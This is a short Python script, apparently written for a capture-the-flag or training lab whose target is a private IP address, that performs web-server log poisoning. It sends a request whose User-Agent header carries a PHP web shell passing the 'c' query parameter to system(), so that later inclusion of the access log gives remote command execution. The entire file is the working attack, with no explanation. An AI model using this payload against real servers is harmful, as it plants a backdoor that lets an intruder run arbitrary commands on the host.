import requests

url="http://10.10.234.93"
print("poisoning logs...")

payload = "<?php system((isset($_GET['c']))?$_GET['c']:'echo'); ?>"
headers = {"User-Agent": payload}

r = requests.get(url, headers = headers)

if r.status_code == 200:
      print("log poisoned!")
else:
    print("an error occurred, please try again")
